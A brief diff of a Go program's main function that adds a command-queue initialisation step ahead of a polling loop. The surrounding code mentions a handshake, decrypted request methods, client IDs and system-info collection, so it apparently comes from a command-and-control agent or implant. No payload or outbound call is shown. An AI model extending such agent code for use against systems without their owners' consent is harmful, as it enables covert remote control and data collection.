@@ -123,6 +123,9 @@ func main() {
 	//handshakeManager.decryptedValues["GET Method"],  // Changed to match
 	//handshakeManager.decryptedValues["POST Method"]) // Changed to match
 
+	// Initialize command queue after all init() functions have registered feature handlers
+	initCommandQueue()
+
 	// START POLLING HERE - Only start it once after successful handshake
 	sysInfoReport, err := collectSystemInfo(getClientID())
 	if err != nil {
